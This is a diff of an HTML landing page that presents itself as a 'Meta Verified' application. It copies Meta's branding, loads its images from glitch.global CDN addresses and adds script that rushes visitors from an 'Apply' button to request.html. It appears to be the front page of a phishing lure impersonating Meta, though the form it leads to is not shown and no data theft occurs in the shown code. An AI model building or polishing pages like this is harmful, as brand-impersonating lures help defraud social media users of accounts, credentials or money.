@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Home</title>
+    <title>Meta Verified - Fast Application</title>
     <style>
         * {
             margin: 0;
@@ -55,25 +55,11 @@
             filter: drop-shadow(0 4px 6px rgba(0,0,0,0.1));
         }
 
-        .new-tag {
-            display: inline-block;
-            background: #E4F0FF;
-            color: #0064E0;
-            padding: 0.5rem 1.5rem;
-            border-radius: 100px;
-            font-size: 0.875rem;
-            margin-left: 1rem;
-            font-weight: 500;
-            box-shadow: 0 2px 4px rgba(0,100,224,0.1);
-        }
-
         h1 {
             font-size: 3.5rem;
             margin: 2rem 0;
             line-height: 1.2;
-            background: linear-gradient(135deg, #000000,  #000000);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            color: #000000;
             letter-spacing: -0.02em;
         }
 
@@ -87,6 +73,27 @@
             font-weight: 500;
             margin: 1rem 0;
             box-shadow: 0 4px 12px rgba(0,100,224,0.2);
+            cursor: pointer;
+            border: none;
+            font-size: 1rem;
+            position: relative;
+            overflow: hidden;
+            transition: transform 0.1s ease;
+        }
+
+        /* Fast pulse animation */
+        @keyframes fastPulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.03); }
+            100% { transform: scale(1); }
+        }
+
+        .apply-btn:hover {
+            animation: fastPulse 0.3s ease;
+        }
+
+        .apply-btn:active {
+            transform: scale(0.98);
         }
 
         .description {
@@ -157,14 +164,7 @@
             box-shadow: 0 20px 40px rgba(0,0,0,0.1);
         }
 
-        .image-overlay {
-            position: absolute;
-            inset: 0;
-            background: linear-gradient(180deg, rgba(0,0,0,0) 0%, rgba(0,0,0,0.2) 100%);
-            border-radius: 1rem;
-        }
-
-        /* 1. Mobile-only styles */
+        /* Mobile-only styles */
         @media (max-width: 480px) {
             .main-content {
                 flex-direction: column;
@@ -189,10 +189,12 @@
 
             .apply-btn {
                 padding: 0.75rem 2rem;
+                width: 100%;
+                text-align: center;
             }
         }
 
-        /* 2. Mobile Chrome Desktop view styles */
+        /* Tablet view styles */
         @media (min-width: 481px) and (max-width: 1024px) {
             .main-content {
                 flex-direction: row;
@@ -215,16 +217,12 @@
                 font-size: 2.5rem;
                 line-height: 1.4;
                 margin-bottom: 1.5rem;
-                text-align: left;
-                font-weight: 700;
-                color: #111;
             }
 
             .description {
                 font-size: 1.1rem;
                 max-width: 100%;
                 margin-bottom: 2rem;
-                line-height: 1.7;
             }
 
             .apply-btn {
@@ -233,30 +231,10 @@
 
             .hero-image {
                 height: 480px;
-                width: 100%;
-                object-fit: cover;
-                border-radius: 1rem;
-                box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
-            }
-
-            .features-list li {
-                font-size: 1.1rem;
-                margin-bottom: 1.2rem;
-                color: #374151;
-                font-weight: 500;
-                line-height: 1.5;
-            }
-
-            .business-link {
-                font-size: 1.1rem;
-            }
-
-            .disclaimer {
-                font-size: 0.95rem;
             }
         }
 
-        /* 3. Laptop or PC styles */
+        /* Laptop or PC styles */
         @media (min-width: 1025px) {
             .main-content {
                 flex-direction: row;
@@ -273,11 +251,6 @@
 
             h1 {
                 font-size: 3.5rem;
-                font-weight: 700;
-            }
-
-            .description {
-                font-size: 1.125rem;
             }
 
             .apply-btn {
@@ -286,10 +259,6 @@
 
             .hero-image {
                 height: 700px;
-                width: 100%;
-                object-fit: cover;
-                border-radius: 1rem;
-                box-shadow: 0 6px 18px rgba(0, 0, 0, 0.2);
             }
         }
     </style>
@@ -304,16 +273,18 @@
     <main class="main-content">
         <section class="left-section">
             <div class="badge-container">
-                <img src="blue-verified-badge-18768.png" alt="Verified Badge" class="badge">
+                <img src="https://cdn.glitch.global/9c268ed6-4eec-4c0c-9cb5-edf84fe4ab44/blue-verified-badge-18768.png?v=1724612186554" alt="Verified Badge" class="badge">
             </div>
             
             <h1>Become <br>Meta Verified</h1>
             
-            <a href="request.html" class="apply-btn">Apply</a>
+            <!-- Using a simple anchor tag for fastest possible redirection -->
+            <a href="/request.html" class="apply-btn">Apply </a>
             
             <p class="description">
-                Grow your social presence with Meta Verified – a new subscription <br> bundle available for creators and businesses on Instagram and <br> Facebook.
+                Grow your social presence with Meta Verified – a new subscription bundle available for creators and businesses on Instagram and Facebook.
             </p>
+            
             <p class="sign-up">Sign up now for creators</p>
             
             <ul class="features-list">
@@ -331,8 +302,36 @@
         </section>
 
         <section class="right-section">
-            <img src="1000081140_LE_upscale_magic_beta_x4_strength_75_similarity_50_light_ai_10_tone_enhance_30_color_enhance_30.jpg" alt="Meta Verified" class="hero-image">
+            <img src="https://cdn.glitch.global/b7587d54-d587-4767-a79a-f12c49fffeb5/1000081140_LE_upscale_magic_beta_x4_strength_75_similarity_50_light_ai_10_tone_enhance_30_color_enhance_30.jpg?v=1734995406637" alt="Meta Verified" class="hero-image">
         </section>
     </main>
+
+    <!-- Minimal JavaScript for fastest redirection -->
+    <script>
+        // Preload the request.html page for instant loading
+        const link = document.createElement('link');
+        link.rel = 'preload';
+        link.href = 'request.html';
+        link.as = 'document';
+        document.head.appendChild(link);
+        
+        // Add fast click event listener as backup
+        document.addEventListener('DOMContentLoaded', function() {
+            const applyBtn = document.querySelector('.apply-btn');
+            if (applyBtn) {
+                // Use fast click with immediate redirect
+                applyBtn.addEventListener('click', function(e) {
+                    // Allow the native anchor tag behavior for fastest redirect
+                    // This is just a backup in case the native behavior is prevented
+                    window.location.href = this.href;
+                }, false);
+                
+                // For touch devices - trigger on touchstart for immediate response
+                applyBtn.addEventListener('touchstart', function() {
+                    // Let the native click handle it for fastest response
+                }, {passive: true});
+            }
+        });
+    </script>
 </body>
 </html>
